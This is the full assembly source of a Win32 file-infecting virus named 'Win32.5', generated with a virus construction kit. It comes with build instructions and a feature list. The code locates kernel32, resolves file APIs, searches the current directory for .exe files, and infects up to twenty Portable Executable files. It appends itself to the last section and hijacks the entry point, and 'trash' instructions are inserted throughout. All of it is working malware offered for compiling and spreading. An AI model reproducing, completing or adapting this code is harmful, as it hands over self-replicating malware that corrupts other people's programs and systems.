              
;
;
; Win32.5 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.5
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 5
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 26
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 19208 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ecx
 neg edx                                ; Trash
 sub ecx, offset Delta
                                        ; mov ebp, ecx
 mov ebp, ecx
 jmp KernelSearchStart


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 lea edx, [ebp+WFD_nFileSizeLow]
 mov dword ptr [ebp+Trash1], ecx        ; Trash
 xchg edx, ebx

 cmp dword ptr [ebx], 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 mov ebx, offset WFD_szFileName
 add ebx, ebp

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 mov ecx, offset WFD_szFileName
 add ecx, ebp


 push ecx
 add ebx, edx                           ; Trash
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
                                        ; check for maximum filesize
 lea esi, [ebp+WFD_nFileSizeHigh]
 xchg ebx, esi

 cmp dword ptr [ebx], 0
 jne NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear esi
 xor esi, esi
 add esi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [esi], 'ZM'
 je Goodfile
                                        ; mov eax, 5310
 push 5310d
 pop eax
 cmp eax, 5310d
 je Notagoodfile

Goodfile:
                                        ; clear ebx
 mov ebx, -61451d
 add ebx, 61451d
 mov bx, word ptr [esi+3Ch]
                                        ; add ebx, 1
 add ebx, 1d
 sub ebx, 1
 jz Notagoodfile
 push dword ptr [esi+3Ch]
 pop edx
                                        ; check if header lies inside the file
 cmp edx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edx, esi
                                        ; check for PE Header
                                        ; check for EP
 movzx eax, word ptr [edx]
 sub eax, 'EP'
 jz Goodfile2
                                        ; mov eax, 12322
 mov eax, ( 12322d xor 12d )
 xor eax, 12d
 cmp eax, 12322d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], '5'
 jz Notagoodfile
                                        ; check for OBJ
 mov ax, word ptr [edx+16h]
 and ax, 00002h
 cmp ax, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov cx, word ptr [edx+16h]
 and cx, 0F000h
 cmp cx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
                                        ; clear ecx
 mov ecx, -58865d
 add ecx, 58865d
 add ecx, dword ptr [ebp+Attributes]
 push ecx
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, ecx

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov [ebp+InfCounter], 20d
 lea esi, [ebp+filemask]
 xchg esi, edi
 sbb edx, 21d                           ; Trash

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 sub eax, -1d
 dec eax
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
                                        ; mov ecx, -1
 mov ecx, -1d
 and ecx, dword ptr [ebp+InfCounter]
 test ecx, ecx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;                  [ ///// * Data * \\\\\ ]

Data:
 InfCounter  dd 0h
 MapHandle   dd 0h
 OldEIP      dd 0h
 ATableVA    dd 0h

 APIOffsets:
 XSetFileAttributesA    dd 0h
 XGetFileAttributesA    dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileA           dd 0h
 XMapViewOfFile         dd 0h
 XFindNextFileA         dd 0h
 XCloseHandle           dd 0h
 XCreateFileMappingA    dd 0h
 XFindFirstFileA        dd 0h
 XFindClose             dd 0h

 K32Trys     dd 0h
 filemask    db '*.eXe',0
 TempAPI     dd 0h

 APINames:
 db 'SetFileAttributesA', 0
 db 'GetFileAttributesA', 0
 db 'UnmapViewOfFile', 0
 db 'CreateFileA', 0
 db 'MapViewOfFile', 0
 db 'FindNextFileA', 0
 db 'CloseHandle', 0
 db 'CreateFileMappingA', 0
 db 'FindFirstFileA', 0
 db 'FindClose', 0

 OTableVA    dd 0h
 Attributes  dd 0h
 NTableVA    dd 0h
 MapAddress  dd 0h
 TempApisearch3 dd 0h
 AlignReg1   dd 0h
 KernelMZ    dd 0h
 db 'Virus : Win32.5 Author : SnakeByte',0
 OldBase     dd 400000h
 FileHandle  dd 0h
 NewEIP      dd 0h
 AlignReg2   dd 0h
 FindHandle  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 counter     dw 0h
 NewSize     dd 0h
 Trash1      dd 0h
 KernelPE    dd 0h




;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear eax
 xor eax, eax

 push eax
 push eax
 push 3h
 push eax
                                        ; add eax, 1
 add eax, 1d
 push eax
 mov eax, 80000000h or 40000000h
 push eax
 mov ecx, ebp
 add ecx, offset WFD_szFileName

 push ecx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], 0
 xor dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; mov ecx, -1
 mov ecx, ( -1d - 30d )
 add ecx, 30d
 and ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx
 push 0
 push ecx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 push eax
 pop dword ptr [ebp+MapHandle]
 pop ecx
 test eax, eax
 jz CloseFile
 push ecx
 push 0
 push 0
                                        ; mov ebx, 2
 mov ebx, 2d
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 add dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
                                        ; clear eax
 mov eax, 48472d
 sub eax, 48472d
 xor eax, dword ptr [ebp+OldEIP]

 push eax
 pop dword ptr [ebp+retEIP]

                                        ; clear ecx
 push 0
 pop ecx
 xor ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], ecx


                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop eax
 push eax
                                        ; round to pages
 sub ax, ax
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 0
 add dword ptr [ebp+K32Trys], 7h

GK1:                                    ; check for DOS-EXE Stub
                                        ; clear ecx
 push 0
 pop ecx
 xor ecx, dword ptr [ebp+K32Trys]
 or ecx, ecx
 jz NoKernel
                                        ; check for ZM
 movzx edx, word ptr [eax]
 xor edx, 'ZM'
 jz CheckPE

GK2:
 sub eax, 65536d
 dec dword ptr [ebp+K32Trys]
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov ecx, [eax+3Ch]
 neg eax
 sub ecx, eax
 neg eax
                                        ; check for EP
 movzx ebx, word ptr [ecx]
 cmp ebx, 'EP'
 je CheckDLL
 jmp GK2
 neg edx                                ; Trash

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add ecx, 22
 inc ecx
 add ecx, 21d
                                        ; clear edx
 mov edx, 0
 mov dx, word ptr [ecx]
 and dx, 0F000h
 cmp dx, 02000h
 je GotDLL
 jmp GK2
GotDLL:                                 ; we found a DLL file
 inc ecx
 sub ecx, 23d


KernelFound:
 mov dword ptr [ebp+KernelMZ], 0
 xor dword ptr [ebp+KernelMZ], eax
 mov dword ptr [ebp+KernelPE], 0
 xor dword ptr [ebp+KernelPE], ecx

 mov ebx, offset GetApis
 add ebx, ebp

 push ebx
ret

;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Lenght of API-Name
                                        ; ebx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



                                        ; clear edi
 xor edi, edi
 add edi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov edx, [edi+78h]
 add edx, [ebp+KernelMZ]
                                        ; add edx, 28
 add edx, 28d
                                        ; get ATableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
                                        ; add edx, 4
 dec edx
 add edx, 5d
 mov dword ptr [ebp+ATableVA], edi
                                        ; get NTableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edi
                                        ; add edx, 4
 dec edx
 add edx, 5d
                                        ; get OTableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi
                                        ; clear eax
 push 0
 pop eax
 xor eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 mov edx, dword ptr [eax]
 add edx, [ebp+KernelMZ]
                                        ; mov eax, edx
 push edx
 pop eax
                                        ; mov edi, edx
                                        ; clear edi
 xor edi, edi
 add edi, edx
 push ecx
 push edi
 mov dword ptr [ebp+TempApisearch3], 0
 xor dword ptr [ebp+TempApisearch3], ebx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov dh, byte ptr [ebx]
 cmp dh, byte ptr [edi]
 jne ApiNotFound
 add ecx, -1
 dec ecx
 inc ecx
 jz FoundApi1
                                        ; add edi, 1
 add edi, 1d
                                        ; add ebx, 1
 add ebx, 1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop ecx
 pop eax
                                        ; mov ebx, -1
 mov ebx, ( -1d xor 21d )
 xor ebx, 21d
 and ebx, dword ptr [ebp+TempApisearch3]
                                        ; add eax, 4
 inc eax
 add eax, 3d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop eax
 pop eax
 pop eax
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 xchg edx, eax
 movzx edx, word ptr [eax]
 clc
 rcl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 push dword ptr [ebp+KernelMZ]
 xor dword ptr [ebp+Trash1], 1066344    ; Trash
 pop eax
 add eax, dword ptr [edx]
 push eax
 pop dword ptr [ebp+TempAPI]
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 sal ebx, 22d                           ; Trash
                                        ; clear edx
 mov edx, -4595d
 add edx, 4595d
 mov ecx, dword ptr [ebp+AlignReg2]
 push eax
 div ecx
 sub ecx, edx
 neg ebx                                ; Trash
 pop eax
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; mov esi, -1
 mov esi, 0
 add esi, -1d
 and esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], esi

                                        ; mov eax, -1
 mov eax, ( -1d xor 35d )
 xor eax, 35d
 and eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], eax



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 adc dword ptr [ebp+Trash1], eax        ; Trash
 mov ecx,12345678h
 org $-4
 retBase dd 0h
 add ecx,12345678h
 org $-4
 retEIP dd 0h
 jmp ecx



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear eax
 xor eax, eax
 add eax, NumberOfApis

                                        ; load API Names and Offsets
 mov ebx, offset APINames
 add ebx, ebp

 lea ecx, [ebp+APIOffsets]
 xchg edi, ecx


GetApisLoop: 

 mov ecx, ebx
APINameDetect:                          ; calculate the lenght of the names
 inc ecx
 cmp byte ptr [ecx], 0
 jne APINameDetect
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 push ecx
 sub dword ptr [esp], ebx
 pop ecx
                                        ; search 'em
                                        ; ecx contains Name-Lenght
                                        ; ebx points to the Name
                                        ; edi points to the offset

 call SearchAPI1
                                        ; add ebx, 1
 inc ebx
 push ebx
 add dword ptr [esp], ecx
 pop ebx
 push dword ptr [ebp+TempAPI]
 pop edx
 mov dword ptr [edi], edx
                                        ; add edi, 4
 add edi, 4d
 dec eax
 jnz GetApisLoop
 lea eax, [ebp+Outbreak]
 xchg eax, ecx

 push ecx
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear edi
 push 0
 pop edi
 add edi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov eax, [edi+3Ch]
 add eax, edi
                                        ; get File Alignment
                                        ; add eax, 60
 add eax, 60d
 mov ecx, [eax]
 dec eax
 sub eax, 59d
                                        ; clear eax
 mov eax, -48785d
 add eax, 48785d
 xor eax, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ecx
 push eax
 pop dword ptr [ebp+AlignReg1]
 call Align
                                        ; mov eax, -1
 mov eax, ( -1d - 13d )
 add eax, 13d
 and eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
                                        ; clear esi
 sub esi, esi
 add esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ecx, dword ptr [esi+3Ch]
 add ecx, esi
                                        ; infect by increasing the last section
                                        ; clear esi
 and esi, 0
 add esi, ecx
                                        ; get last section
 movzx ebx, word ptr [esi+06h]
 add ebx, -1
 imul ebx, ebx, 28h
                                        ; add ecx, 120
 dec ecx
 add ecx, 121d
 add ecx, ebx
                                        ; clear eax
 mov eax, 30997d
 sub eax, 30997d
 add eax, dword ptr [esi+74h]
 sal eax, 3
 add ecx, eax
                                        ; get old Entrypoint
 mov ebx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], 0
 add dword ptr [ebp+OldEIP], ebx
 mov ebx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 xor dword ptr [ebp+OldBase], ebx
                                        ; clear edx
 sub edx, edx

 add edx, [ecx+10h]
                                        ; mov ebx, edx
 mov ebx, edx
 add ecx, 14h
 add edx, [ecx]
 sub ecx, 14h
 push edx
 mov eax, ebx
 add eax, [ecx+0Ch]
 mov dword ptr [ebp+NewEIP], 0
 add dword ptr [ebp+NewEIP], eax
                                        ; save new enty point in file
 mov dword ptr [esi+28h], eax
 mov eax, [ecx+10h]
 push eax
                                        ; calculate new section size
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], eax
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
 push dword ptr [ebp+AlignReg1]
 pop eax
 mov dword ptr [ecx+10h], 0h
 add dword ptr [ecx+10h], eax
 pop eax
 add eax, VirusSize
 mov dword ptr [ecx+08h], eax
 mov eax, dword ptr [ecx+10h]
 add eax, dword ptr [ecx+0Ch]
 mov dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [ecx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], '5'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize
 mov esi, ebp
 add esi, offset Virus


AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 adc dword ptr [ebp+Trash1], edx        ; Trash
 pop ecx
 sub ecx, 1
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 add ebx, 18468119d                     ; Trash
 stc
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg ebx, edx

 push ebx
                                        ; clear edx
 and edx, 0
 xor edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov ebx, ebp
 add ebx, offset WIN32_FIND_DATA

 push ebx
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov ecx, ebp
 add ecx, offset WFD_szFileName

                                        ; mov ebx, 276
 push 276d
 pop ebx

ClearOldData2:
 mov byte ptr [ecx], 0h
                                        ; add ecx, 1
 inc ecx
 dec ebx
 jnz ClearOldData2
 popad
ret





CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear edx
 sub edx, edx
 push edx
 call ExitProcess



end FakeCode

